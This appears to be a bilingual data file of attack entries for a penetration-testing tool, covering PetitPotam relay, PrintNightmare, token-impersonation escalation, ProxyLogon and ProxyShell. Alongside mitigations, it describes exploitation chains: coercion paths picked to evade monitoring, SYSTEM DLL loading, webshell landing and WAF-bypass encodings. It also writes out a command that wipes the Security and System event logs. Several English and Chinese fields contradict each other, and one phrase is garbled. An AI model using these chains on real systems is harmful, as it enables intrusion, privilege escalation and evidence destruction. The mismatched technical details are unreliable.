    reg add "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v LDAPServerIntegrity /t REG_DWORD /d 2 /f
mitigation.en: Install EFSRPC-related patches on DCs and disable anonymous EFSRPC calls, require EPA on all ADCS endpoints, and enable LDAP signing with channel binding; monitor certificate requests with abnormal templates or hostnames. After the fix, regress with the step 2 sample: callbacks must stop or the relay must be rejected by EPA.

title.zh: 架设 LDAP 与 ADCS 中继

description.zh: 启动 ntlmrelayx.py 指向 CA 的 Web 注册端点并启用 --adcs（证书服务与域控同机时 {CA_HOST} 即 {DC_HOST}）；服务就绪等待认证即搭好证书申请中继阵地。
description.en: Start ntlmrelayx.py -t ldap://DC --adcs --smb2support; the listener standing by completes the certificate-request relay position.

title.zh: 触发 EFSRPC 强制认证

description.zh: 运行 petitpotam.py 携带域凭据诱导目标回连操作机；中继端打印已认证账号即强制认证触发成功。
description.en: Run petitpotam.py with domain creds to force the target back to your host; the authenticated account printed on the relay confirms coercion.

title.en: Mint a certificate to entrench access

description.zh: 在中继端为被劫持账号申请 Base64 证书；证书不受密码轮换影响，可用其通过 PKINIT 申请 Kerberos 票据，长期维持该身份。
description.en: Request a Base64 certificate for the hijacked account on the relay; rotation-proof, it sustains the identity through Kerberos ticketing long-term.

title.zh: 摸排签名缺口扩大中继
title.en: Find more relay targets without signing

description.zh: 用 Get-SmbServerConfiguration 检查签名强制项；未强制签名的服务器清单即后续 SMB 中继的优先打击面。
description.en: Check enforcement fields with Get-SmbServerConfiguration; servers without mandatory signing are the preferred relay targets next.

description.zh: 绕过对 EFSRPC(UUID e351) 调用的监控：改走 MS-RPRN 打印机路径触发认证；relay 端收到 NTLM 即成功。
description.en: Trigger via the MS-RPRN printer path to bypass EFSRPC UUID monitoring; NTLM arriving at the relay confirms success.

description.zh: 换用 MS-DFSNM 删除副本根路径强制出站认证；监听端收到认证请求即成功。
description.en: Coerce via the DFS-NM standby-root removal path instead; an auth request reaching the listener confirms success.

description.zh: ShadowCoerce 触发路径 — 换用 MS-FSRVP（需目标启用 File Server VSS Agent 服务，部分版本需触发两次）路径强制出站认证；中继端捕获认证即成功。
description.en: Coerce via the MS-SRVS share enumeration path; the relay capturing credentials confirms success.

title.zh: 中继认证申请 DC 证书
title.en: PetitPotam and EFSRPC Exposure Audit Reviewed Command 1

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_PETITPOTAM_E_1 与蓝队日志；成功时被强制认证转发至 AD CS Web 注册端点，中继端输出 DC 机器账户证书（Base64）即成功。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_PETITPOTAM_E_1 with blue-team logs; relaying to the DC LDAP and obtaining the DC machine certificate confirms success.

title.en: PetitPotam and EFSRPC Exposure Audit Reviewed Command 2

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_PETITPOTAM_E_2 与蓝队日志；成功时域控向操作主机发起 NTLM 认证回调。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_PETITPOTAM_E_2 with blue-team logs; the DC initiating an NTLM authentication callback to the operator host confirms success.

title.zh: 核对 SMB 签名策略
title.en: PetitPotam and EFSRPC Exposure Audit Reviewed Command 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_PETITPOTAM_E_3 与蓝队日志；成功时输出 SMB 服务器签名配置；RequireSecuritySignature 为 True 表示 SMB 中继受阻。注意该值只反映 SMB 签名策略，LDAP 中继是否受限需另行核对域控的 LDAP 签名/通道绑定配置。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_PETITPOTAM_E_3 with blue-team logs; SMB signing output with RequireSecuritySignature True indicating restricted LDAP relay confirms the configuration check.

name.zh: PrintNightmare 暴露面与补丁审计

description.zh: 验证 PrintNightmare（CVE-2021-34527）补丁状态与打印服务暴露面。
description.en: Checks Print Spooler patch state and exposure, then calls AddPrinterDriver over MS-RPRN pointing at an attacker-controlled DLL that loads as SYSTEM on unpatched hosts (CVE-2021-34527).

subCategory.zh: 域控漏洞与已知利用链

overview.zh: PrintNightmare 暴露面与补丁审计覆盖打印服务远程执行场景：针对未修补或 Point and Print 配置过宽的主机，验证 MS-RPRN 暴露、驱动 DLL 加载执行与强制认证三条链路。验证维度涵盖 RPC 协议探测、CVE-2021-34527 载荷执行与 dementor 认证强制。
overview.en: PrintNightmare Exposure and Patch Audit covers print-service remote execution: for hosts that are unpatched or have overly permissive Point and Print configuration, verify the MS-RPRN exposure, driver DLL load-execution, and coercion chains. Verification dimensions cover RPC protocol probing, CVE-2021-34527 payload execution, and dementor authentication coercion.

vulnerability.zh: 根因是 Print Spooler 的 MS-RPRN 接口允许认证用户调用 AddPrinterDriver 等方法，未修补主机的驱动路径可指向攻击者可控 DLL 并以 SYSTEM 加载（CVE-2021-34527）；Spooler 远程接口同时可作为强制认证原语配合中继使用。
vulnerability.en: The root cause is that the Print Spooler's MS-RPRN interface lets authenticated users invoke methods such as AddPrinterDriver, and on unpatched hosts the driver path can point to an attacker-controlled DLL loaded as SYSTEM (CVE-2021-34527); the Spooler's remote interface also serves as a coercion primitive usable with relays.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 rpcdump.py 探测目标，grep 命中 MS-RPRN 即确认打印协议暴露；第 2 步在授权环境运行 CVE-2021-34527.py 指向 DLL 夹具，目标以 SYSTEM 加载 DLL 且 spoolsv 出现异常加载即确认可利用；第 3 步用 dementor.py 触发目标向操作主机共享发起认证回调，验证 Spooler 强制认证原语，可与 NTLM 中继组合升级为 AD CS 证书窃取。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 probes the target with rpcdump.py — a grep hit on MS-RPRN confirms print protocol exposure; step 2 runs CVE-2021-34527.py against a DLL fixture in an authorized environment — SYSTEM loading of the DLL plus abnormal spoolsv loads confirms exploitability; step 3 triggers a target-to-operator share authentication callback with dementor.py, validating the Spooler coercion primitive that pairs with NTLM relay for ADCS certificate theft. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
全部主机安装 2021-06+ 打印补丁，域控与敏感服务器直接禁用 Spooler，启用 RestrictDriverInstallationToAdministrators：
    Stop-Service Spooler -Force; Set-Service Spooler -StartupType Disabled
    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
mitigation.en: Install 2021-06+ print-service patches on all hosts, disable the Print Spooler service outright on DCs and sensitive servers, enable RestrictDriverInstallationToAdministrators, and tighten Point and Print; monitor abnormal spoolsv DLL loads. After the fix, regress with the step 1 sample: the interface should be closed or driver installation blocked by the patch.

description.zh: 运行 rpcdump.py @目标 并过滤 MS-RPRN；返回打印系统 RPC 接口即 Spooler 服务可达、PrintNightmare 前提成立。
description.en: Run rpcdump.py @target and grep MS-RPRN; a print-system RPC interface confirms Spooler reachability and the PrintNightmare precondition.

title.zh: 加载恶意 DLL 拿 SYSTEM
title.en: Load a malicious DLL as SYSTEM

description.zh: 用 CVE-2021-34527.py 提交指向己方共享的 DLL 路径；目标以 SYSTEM 加载 DLL 并触发回连即获得最高权限执行。
description.en: Submit your share-hosted DLL path with CVE-2021-34527.py; the target loading it as SYSTEM and calling back grants highest-privilege execution.

title.zh: 联动强制认证扩展收割
title.en: Chain coerced auth for more hashes

description.zh: 用 dementor.py 让目标向操作机 UNC 路径发起认证；配合 Responder 或中继捕获凭据即扩大哈希收割面。
description.en: Point the target at your UNC path with dementor.py; pairing with Responder or the relay harvests credentials at scale.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 PrintNightmare 暴露面与补丁审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for PrintNightmare Exposure and Patch Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: PrintNightmare 暴露面与补丁审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: PrintNightmare Exposure and Patch Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 驱动加载以 SYSTEM 执行——驱动文件只含写 marker 的最小 DLL；验证后删除驱动并确认 Print Spooler 恢复正常。
opsecTips.en: The driver loads as SYSTEM — keep the DLL minimal enough to write a marker, then remove the printer driver afterwards and confirm the Spooler is healthy.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: 远端 Spooler 服务探测

description.zh: 以标准 PowerShell 远程管理替代 RPC 指纹工具；Status 为 Running 即打印服务暴露。
description.en: Use standard PowerShell remoting instead of RPC fingerprinting tools; a Running Spooler status confirms exposure.

description.zh: 以凭据化 SMB 管理扫描替代匿名 rpcdump；输出 Spooler service enabled 即成功。
description.en: Replace anonymous rpcdump with credentialed SMB scanning; "Spooler service enabled" output confirms success.

description.zh: 零利用尝试判定补丁状态；未列出对应 KB 即存在可利用面。
description.en: Determine patch state with zero exploitation attempts; missing KBs confirm an exploitable surface.

title.en: PrintNightmare Exposure and Patch Audit Reviewed Command 1

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_PRINTNIGHTMARE_E_1 与蓝队日志；成功时 grep 命中 MS-RPRN，确认打印服务协议暴露。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_PRINTNIGHTMARE_E_1 with blue-team logs; grep matching MS-RPRN confirms the print-service protocol exposure.

title.zh: 打印驱动加载 DLL 提权
title.en: PrintNightmare Exposure and Patch Audit Reviewed Command 2

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_PRINTNIGHTMARE_E_2 与蓝队日志；成功时目标加载 DLL 夹具并以 SYSTEM 执行，蓝队可见 spoolsv 异常加载。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_PRINTNIGHTMARE_E_2 with blue-team logs; the target loading the DLL fixture and executing as SYSTEM with abnormal spoolsv loading confirms success.

title.en: PrintNightmare Exposure and Patch Audit Reviewed Command 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_DOMAIN_PRINTNIGHTMARE_E_3 与蓝队日志；成功时操作主机收到目标发起的认证回调。
description.en: Run in the isolated authorization and correlate PAYLOADER_DOMAIN_PRINTNIGHTMARE_E_3 with blue-team logs; the operator host receiving the target-initiated authentication callback confirms success.

name.zh: Windows 令牌枚举与模拟窃取

description.zh: 枚举当前进程令牌特权（SeImpersonate/SeAssignPrimaryToken 等），评估服务账户的模拟风险面。
description.en: Enumerates the current process token's privileges such as SeImpersonate and SeAssignPrimaryToken to map the impersonation risk surface of service accounts, then demonstrates token capture through a named-pipe or COM authentication lure.

overview.zh: 该 Payload 覆盖 Windows 令牌权限与模拟提权场景，检验高权限令牌的可枚举与可模拟面。验证维度含令牌列举、令牌窃取与 JuicyPotato、PrintSpoofer、GodPotato 三条模拟提权路径，对应第 1 至第 5 步。
overview.en: This payload covers Windows token-privilege and impersonation escalation, testing how enumerable and stealable high-privilege tokens are. Validation covers token listing, token theft, and the JuicyPotato, PrintSpoofer and GodPotato impersonation paths, mapped to steps 1 through 5.

vulnerability.zh: 根因在于服务进程常以高权限运行且默认授予 SeImpersonate 类特权：具备该特权的低权账户可诱骗高权限身份完成命名管道或 COM 认证，进而模拟其令牌获得 SYSTEM。
vulnerability.en: The root cause is service processes running with high privileges and defaulting to impersonation-class privileges: a low-privileged account holding SeImpersonate can lure a high-privilege identity into named-pipe or COM authentication and impersonate its token for SYSTEM.

exploitation.zh: 第 1 步用 mimikatz 的 token::list 枚举令牌锁定可模拟目标，以输出完整令牌与所属账户清单为判据；第 2 步以 token::elevate 验证指定域用户令牌窃取，以当前 shell 身份切换为目标用户（whoami 回显目标用户）为判据；第 3 至第 5 步依次运行 JuicyPotato、PrintSpoofer 与 GodPotato，绑定命令以 SYSTEM 执行即确认对应路径，以 whoami 回显 nt authority\system 为判据。占位符在全局变量菜单替换；仅授权实验主机。
exploitation.en: In step 1, enumerate tokens with mimikatz token::list locking onto stealable targets. In step 2, verify theft of a specified domain user's token with token::elevate. In steps 3 through 5, run JuicyPotato, PrintSpoofer and GodPotato in turn; bound commands executing as SYSTEM confirm each path, judged by whoami output. Replace placeholders via the global variables menu; authorized lab hosts only.

mitigation.zh:
移除非必要服务的 SeImpersonate 与 SeAssignPrimaryToken 特权，服务账户改用托管身份，终端监控 potato 家族的进程与管道行为：
    sc.exe qprivs AppSvc                                   # 查看当前特权
    sc.exe privs AppSvc "SeChangeNotifyPrivilege/SeCreateGlobalPrivilege"   # 收窄特权白名单
    sc.exe config AppSvc obj= "NT SERVICE\AppSvc"          # 专用虚拟账号运行
    sc.exe sidtype AppSvc restricted
    修复后重放第 3 至第 5 步，提权工具应全部失败并触发告警。
mitigation.en: Strip SeImpersonate and SeAssignPrimaryToken from unneeded services, use managed identities for service accounts, and monitor potato-family process and pipe behavior on endpoints. After the fix, replay steps 3 through 5: every escalation tool should fail with alerts.

title.zh: 枚举可窃取的高权限令牌

description.zh: 用 mimikatz 的 token::list 列出系统全部令牌；输出中存在 SYSTEM 或 Administrator 所属令牌即锁定窃取目标，重点看可模拟的高完整性会话。
description.en: List all tokens with mimikatz token::list; SYSTEM or Administrator-owned tokens in the output become the impersonation targets.

description.zh: 用 token::elevate 指定 Administrator 域用户窃取其令牌；当前 shell 上下文切换为目标身份即完成模拟，直接继承该账户全部权限执行操作。
description.en: Invoke token::elevate for the Administrator account; the shell switching to that identity inherits every permission of the impersonated user.

description.zh: 以 SeImpersonate 特权运行 JuicyPotato 触发 COM 本地提权；绑定的 cmd 以 SYSTEM 执行即从服务账号跃升到最高权限，拿到管理员外壳。
description.en: Run JuicyPotato leveraging SeImpersonate to abuse COM elevation; the bound command executing as SYSTEM lifts a service account to the top of the box.

description.zh: 运行 PrintSpoofer 伪装打印服务命名管道，诱骗以 SYSTEM 运行的打印组件回连模拟；得到的 shell 显示 SYSTEM 即确认备选提权路径可用。
description.en: Run PrintSpoofer to fake a print-service named pipe and bait the SYSTEM spooler into impersonation; a SYSTEM shell proves the alternate route works.

title.en: Fall back to GodPotato on patched hosts

description.zh: 运行 GodPotato 借助 RPCSS 伪装链执行 whoami；返回 SYSTEM 即在补丁较新的环境仍可提权，与前两条路径互为备份手段。
description.en: Run GodPotato riding the RPCSS masquerade chain to execute whoami; a SYSTEM result keeps escalation viable on newer patches, backing up the other two routes.

prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Windows Token Privilege and Impersonation Protection are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 令牌模拟产生的高权限进程只执行 marker 回显类命令，不在服务进程内长时间驻留。
opsecTips.en: Impersonated high-privilege processes run marker-echo commands only, and never linger inside service processes.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。

title.zh: 规避变体：已有会话窃取令牌
title.en: Evasion: token theft via existing session

description.zh: 规避点：不落地 mimikatz 二进制（绕杀软签名与磁盘审计），用既有 meterpreter 会话窃取目标进程令牌。判据：getuid 显示被窃取用户。
description.en: Avoids dropping mimikatz (signature and disk audit evasion) by stealing a token from an existing process. Success: getuid shows the target user.

title.zh: 规避变体：PowerShell 令牌模拟

description.zh: 规避点：内存加载 PowerShell 版模拟替代 mimikatz exe。判据：当前线程身份变为 Administrator。
description.en: In-memory PowerShell replacement for the mimikatz binary. Success: thread identity becomes Administrator.

title.zh: 规避变体：换 SweetPotato 规避哈希

description.zh: 规避点：更换工具家族规避已知 Potato 哈希与进程特征，输出重定向文件免弹窗。判据：p.txt 内容为 nt authority\system。
description.en: Different tool family evades known Potato hashes; file output avoids console popups. Success: p.txt shows nt authority\system.

title.zh: 规避变体：执行后痕迹清理

wafBypass.command: wevtutil cl Security && wevtutil cl System && del C:\\Windows\\temp\\p.txt

description.zh: 规避点：清除安全/系统事件日志与临时产物降低取证痕迹（仅在授权演练中使用）。判据：日志查看器中相关记录消失。
description.en: Clears security/system logs and temp artifacts to reduce forensic traces (authorized exercises only). Success: related events gone.

description.zh: 用 Mimikatz 列出系统令牌；输出令牌与所属账户清单即枚举完成，重点观察可模拟的高权限令牌。
description.en: List system tokens with Mimikatz; the printed token and account inventory completes enumeration, focusing on impersonable high-privilege tokens.

description.zh: 用 Mimikatz 窃取指定域用户令牌（/user 为真实参数，目标令牌需先在 token::list 输出中确认存在）；当前 shell 上下文切换为目标用户身份即模拟成功。
description.en: Steals the specified domain user's token with Mimikatz (/user is the real parameter and the token must exist in token::list output); the shell context switching to that user confirms impersonation.

explanation.zh: 窃取并模拟指定用户令牌
指定要窃取的域用户（域\用户名）

description.zh: 运行 JuicyPotato 验证 SeImpersonate 提权路径；绑定命令以 SYSTEM 身份执行即提权成功。
description.en: Run JuicyPotato to validate the SeImpersonate elevation path; the bound command executing as SYSTEM confirms elevation.

explanation.zh: CLSID，选取可被普通用户修改启动权限的 DCOM 类
explanation.en: CLSID of an injectable DCOM class

description.zh: 运行 PrintSpoofer 验证命名管道模拟提权；得到的 shell 显示 SYSTEM 即提权成功。
description.en: Run PrintSpoofer to validate named-pipe impersonation elevation; a shell showing SYSTEM confirms elevation.

description.zh: 运行 GodPotato 验证通用 Potato 提权；cmd /c whoami 返回 SYSTEM 即提权成功。
description.en: Run GodPotato to validate universal Potato elevation; cmd /c whoami returning SYSTEM confirms elevation.

name.zh: Exchange ProxyLogon 补丁回归

description.zh: 验证 ProxyLogon（CVE-2021-26855）SSRF 前提到 Exchange 后台的补丁回归。
description.en: Replays the CVE-2021-26855 SSRF against Exchange static resources to reach the backend ECP as the machine account, then achieves arbitrary file write via CVE-2021-27065, verifying the patch regression state of each link.

subCategory.zh: 已知利用链与访问边界

overview.zh: Exchange ProxyLogon 补丁回归覆盖 SSRF 与任意文件写入组合利用场景：针对未安装 2021-03 补丁的 Exchange 服务器，验证前端到后端代理链与管理员会话获取链路。验证维度涵盖前置路径探测、proxylogon 一键利用与手工代理请求复现三类步骤。
overview.en: Exchange ProxyLogon Patch Regression covers combined SSRF and deserialization exploitation: for Exchange servers without the 2021-03 patch, verify the front-end-to-back-end proxy chain and admin-session acquisition. Verification dimensions cover the pre-condition path probe, one-shot proxylogon exploitation, and manual proxy request replay.

vulnerability.zh: 根因是 Exchange 前端对 /owa/auth/x.js 等静态资源不认证即转发后端，攻击者借前后端信任差异以 Exchange 机器账户身份直达后端 ECP，再经任意文件写入（CVE-2021-27065）落地 WebShell；补丁缺失与前后端信任边界过宽共同构成利用条件（同批补丁另含统一消息组件反序列化漏洞 CVE-2021-26857）。
vulnerability.en: The root cause is that the Exchange front end forwards static resources such as /owa/auth/x.js to the back end without authentication; end-to-end SSRF via set-OwaVirtualDirectory grants back-end access as the Exchange machine account, after which a back-end deserialization flaw executes code. The missing patch plus an overly broad front-end/back-end trust boundary form the exploitation conditions.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步请求 /owa/auth/x.js，返回非 404 即确认前置可达路径存在；第 2 步在授权实验环境运行 proxylogon.py，获取管理员会话并输出服务器名或内存马地址即确认利用成功；第 3 步用手工 POST 复现 Cookie 代理链（X-AnonResource-Backend 指向 ecp/default.flt），返回 ECP 响应即确认代理链路成立。EXCHANGE_HOST 等占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 requests /owa/auth/x.js — any non-404 response confirms the pre-condition path exists; step 2 runs proxylogon.py in an authorized lab — an admin session with the server name or webshell URL printed confirms exploitation; step 3 replays the Cookie proxy chain manually (X-AnonResource-Backend pointing at ecp/default.flt) — an ECP response confirms the proxy path. Replace EXCHANGE_HOST and other placeholders via the global variables menu.

mitigation.zh:
升级至受支持 CU 并安装 2021-03+ SU，Health Checker 核验补丁，限制 ECP/PowerShell 外部暴露并审计邮箱权限变更：
    .\Setup.exe /IAcceptExchangeServerLicenseTerms_DiagnosticDataON /m:upgrade
    .\HealthChecker.ps1 -Server EX01
    Set-EcpVirtualDirectory -Identity 'EX01\ecp (Default Web Site)' -ExternalUrl $null
mitigation.en: Upgrade to a supported CU and install 2021-03+ security updates, verifying patch state with the Exchange Server Health Checker; restrict ECP/PowerShell exposure and audit anomalous Autodiscover, EWS, and mailbox permission changes. After the fix, regress with the step 1 and step 2 samples: the proxy chain must return 404/401 and exploitation must fail.

title.zh: 探测 Exchange 前端暴露

description.zh: 用 curl 访问 /owa/auth/x.js 静态路径；返回 200 与版本特征即定位 CAS 前端角色并确认服务器在线。
description.en: Fetch /owa/auth/x.js with curl; a 200 with version fingerprints locates the CAS front-end role and confirms the server is live.

description.zh: 运行 proxylogon.py 指定目标与管理员邮箱；输出 LegacyDN 与 canary 即拿到经 SSRF 直达后端 ecp 的会话凭证。
description.en: Run proxylogon.py against the target and admin mailbox; LegacyDN and canary output are session material reaching the backend ecp via SSRF.

title.en: Land a webshell with raw requests

description.zh: 构造携带 X-AnonResource-Backend 与ClientId 的 POST 写入目标路径；服务器目录出现 webshell 文件即完成 RCE 持久入口。
description.en: Craft the POST with X-AnonResource-Backend and ClientId headers to write your path; a webshell on disk completes the persistent RCE foothold.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 Exchange ProxyLogon 补丁回归 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Exchange ProxyLogon Patch Regression are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: Exchange ProxyLogon 补丁回归只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Exchange ProxyLogon Patch Regression is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: ProxyLogon 链会在服务器写入文件——限定实验 Exchange、写入路径即用即删；请求量压到链路验证最小值。
opsecTips.en: The ProxyLogon chain writes files on the server — target the lab Exchange only, delete written files right away, and keep request volume to the minimum the chain needs.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 绕过按 localhost/ecp/default.flt?~3 字面匹配 X-AnonResource-Backend 的 WAF 规则：将主机换成 127.0.0.1、对 / ? ~ # 分别做 %2F %3F %7E %23 单元编码并改大小写，Cookie 解码后 SSRF 链等价而签名不命中；成功判据：响应仍出现 X-FEServer/X-CalculatedBETarget 头或 FBA 行为与原链一致。
description.en: Bypasses WAF rules matching the literal localhost/ecp/default.flt?~3 in X-AnonResource-Backend: swapping to 127.0.0.1 and unit-encoding / ? ~ # as %2F %3F %7E %23 with case variance keeps the decoded SSRF chain equivalent; success criterion: response still carries X-FEServer/X-CalculatedBETarget or identical FBA behavior.

description.zh: 绕过对 X-BEResource 中 %23~ 定界符（后端定位 + 端口）特征拦截：一次编码 %23、双重编码 %2523、主机大小写与 ~1/~3 端口变体在反代解码后仍指向后端邮箱服务器；成功判据：响应非 401/403 且出现后端服务器特征（X-BEVersion/X-DiagInfo），说明请求被转发到后端角色。失效条件：仅对做二次 URL 解码的架构成立。
description.en: Bypasses rules keyed on the %23~ delimiter in X-BEResource (backend host + port): single %23, double %2523, host case and ~1/~3 port variants still resolve to the backend mailbox server after proxy decoding; success criterion: a non-401/403 response with backend markers (X-BEVersion/X-DiagInfo) proves backend routing. Failure condition: only works on architectures that run a second URL decode pass.

title.zh: Legacy 前端路径变形探测

description.zh: 绕过仅对 /owa/auth/x.js 精确匹配的拦截与封禁：点段、双斜杠、大小写、%23 截断、; 截断与尾斜杠在 Exchange 前端规范化后仍命中 FBA 匿名端点；成功判据：变形路径返回与原始 x.js 相同的 200 状态与 FBA 页面指纹。
description.en: Bypasses blocks anchored to the exact /owa/auth/x.js: dot segments, double slashes, case, %23 or ; truncation and trailing slash still hit the FBA anonymous endpoint after front-end normalization; success criterion: variants return the same 200 and FBA page fingerprint as the original x.js.

description.zh: 绕过只对 GET/POST + HTTP/1.1 组合建模的 WAF 规则：HTTP/1.0、GET 带 Cookie、OPTIONS 与 chunked 传输在部分引擎走不同解析路径；成功判据：任一组合仍能携带 X-AnonResource-Backend 触发后端 SSRF 行为（响应头含 X-FEServer 或 FBA 特征）。
description.en: Bypasses WAF rules modeling only GET/POST over HTTP/1.1: HTTP/1.0, GET with cookies, OPTIONS and chunked bodies take different parser paths in some engines; success criterion: any combination still carries X-AnonResource-Backend to trigger backend SSRF behavior (X-FEServer header or FBA signature).

title.zh: 探测 OWA 前置路径可达
title.en: Exchange ProxyLogon Patch Regression Reviewed Command 1

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EXCHANGE_PROXYLOGON_E_1 与蓝队日志；成功时目标路径返回非 404 响应，确认前置可达路径存在。
description.en: Run in the isolated authorization and correlate PAYLOADER_EXCHANGE_PROXYLOGON_E_1 with blue-team logs; the target path returning a non-404 response confirms the precondition path exists.

title.en: Exchange ProxyLogon Patch Regression Reviewed Command 2

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EXCHANGE_PROXYLOGON_E_2 与蓝队日志；成功时脚本获取管理员会话并输出服务器名或内存马地址。
description.en: Run in the isolated authorization and correlate PAYLOADER_EXCHANGE_PROXYLOGON_E_2 with blue-team logs; the script obtaining the admin session and printing the server name or shellfish address confirms success.

title.en: Exchange ProxyLogon Patch Regression Reviewed Command 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EXCHANGE_PROXYLOGON_E_3 与蓝队日志；成功时请求被代理到后端并返回 ECP 响应，确认代理链路。
description.en: Run in the isolated authorization and correlate PAYLOADER_EXCHANGE_PROXYLOGON_E_3 with blue-team logs; the request proxying to the backend and returning an ECP response confirms the proxy chain.

name.zh: Exchange ProxyShell 补丁回归

description.zh: 验证 ProxyShell 链（CVE-2021-34473 等）各环节的补丁状态。
description.en: Chains the Autodiscover path-confusion SSRF (CVE-2021-34473) with the unauthenticated backend PowerShell endpoint (CVE-2021-34523) to run Exchange PowerShell cmdlets, checking each link's patch state.

subCategory.zh: 已知利用链与访问边界

overview.zh: Exchange ProxyShell 补丁回归覆盖 Autodiscover 代理滥用场景：针对未安装相关安全补丁的 Exchange 服务器，验证后端代理链与邮箱数据访问链路。验证维度涵盖 autodiscover.json 代理探测、proxyshell 一键利用与手工代理请求复现三类步骤。
overview.en: Exchange ProxyShell Patch Regression covers Autodiscover proxy abuse: for Exchange servers missing the relevant security patches, verify the back-end proxy chain and mailbox data access. Verification dimensions cover the autodiscover.json proxy probe, one-shot proxyshell exploitation, and manual proxy request replay.

vulnerability.zh: 根因是 Autodiscover 端点把邮箱地址写入代理路径而未校验目标（CVE-2021-34473），后端 PowerShell 端点未强制认证（CVE-2021-34523）；两者组合使未认证用户可调用 Exchange PowerShell cmdlet 访问任意邮箱，进一步可写入 WebShell。
vulnerability.en: The root cause is the Autodiscover endpoint writing the mailbox address into the proxy path without validating the target (CVE-2021-34473) while the back-end PowerShell endpoint does not enforce authentication (CVE-2021-34523); combined, an unauthenticated user can invoke Exchange PowerShell cmdlets against any mailbox and even write a webshell.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步请求 autodiscover.json 代理路径，返回 200 即确认后端代理链路可用；第 2 步在授权实验环境运行 proxyshell.py，输出可访问的 WebShell 路径即确认完整利用；第 3 步用手工 GET 把请求转发至后端 /owa/，返回目标邮箱信息即确认代理与身份绕过同时成立。EXCHANGE_HOST 等占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 requests the autodiscover.json proxy path — a 200 confirms the back-end proxy chain; step 2 runs proxyshell.py in an authorized lab — a printed accessible webshell path confirms full exploitation; step 3 forwards the request to the back-end /owa/ with a manual GET — returned mailbox information confirms both proxying and identity bypass. Replace EXCHANGE_HOST and other placeholders via the global variables menu.

mitigation.zh:
升级至受支持 CU 并安装覆盖三个 CVE 的安全更新，Health Checker 核验，限制 Autodiscover/PowerShell 虚拟目录暴露并审计管道调用：
    .\Setup.exe /IAcceptExchangeServerLicenseTerms_DiagnosticDataON /m:upgrade
    .\HealthChecker.ps1 -Server EX01
    Set-PowerShellVirtualDirectory -Identity 'EX01\PowerShell (Default Web Site)' -ExternalUrl $null
